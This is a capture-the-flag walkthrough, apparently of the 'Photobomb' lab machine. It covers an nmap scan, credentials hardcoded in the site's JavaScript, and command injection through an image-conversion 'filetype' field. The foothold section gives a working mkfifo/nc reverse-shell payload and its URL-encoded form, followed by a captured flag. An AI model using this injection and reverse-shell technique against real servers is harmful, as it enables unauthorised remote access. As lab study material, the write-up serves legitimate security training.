# NMAP

The scan shows that photobomb has 80 and 22 open 

```{sh}
$ nmap 10.129.93.24 -sC -sV -p22,80

Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-02 15:01 CET
Nmap scan report for 10.129.93.24
Host is up (0.073s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.91 seconds

```

# WEB PAGE 

the webpage has the following directories

not able to read them 

/source_images
/resized_images

## default 

The webpage has the following information:
<ol>
    <li>its a printing service</li>
    <li>credentials for printing are given to users in a welcome pack </li>
    <li>technichal support team is on  4 4283 77468377</li>
</ol>

when trying to access the link in the description we get a login alert. Looking at the js code that the webpage loads we can see that the credentials are in plain text in the js code 

```{sh}
$ curl http://photobomb.htb/photobomb.js

function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

>pH0t0:b0Mb!

## /printer

in the next web page that loads, we have a form with the names: name (image to select), filetype (type of file to submit), dimensions (the dimensions of printing)

notes:
the sever blacklists (in photo) any form of / or .. 
it also blocks it in the dimensions
it does not in the filetype 
it seems to only have the jpg images and then convert them into png if asked

I am, for now, unable to find an arbitrary file read in the image selector.

playing around with it i broke it and it returned me an error web-page, with some information:

the server is running on ruby using sinatra
some images are in images are in resized_images

## foothold 

after being a long time with the application trying to see if there was anything missing i became aware of something, if i malformed the filename parameter gave me this back:

```{http}
filetype=png;

Failed to generate a copy of wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg
```

Maybie, just maybie, the machine was using an os command to transform the jpg image into a png one, after tampering with it:>

```{http}
filetype=png;+sleep+1000

504 Gateway Time-out
```

Now we only have to give it a reverse shell and i will have user access to the computer: after doing a very small script to transform a string to an url encoded string we have the following shell command:

```{sh}
$ echo ";rm pipe1; mkfifo pipe1; /bin/sh -i 2>&1 0<pipe1 | nc 10.10.14.93 2020 1>pipe1" | python3 url_encoder.py 
%3Brm%20pipe1%3B%20mkfifo%20pipe1%3B%20/bin/sh%20-i%202%3E%261%200%3Cpipe1%20%7C%20nc%2010.10.14.93%202020%201%3Epipe1
```

we just give this to filetype and we are done :)

the user flag (wizard): 906b58a59c720089356b7df85cf0866d

# Studying nginx configuration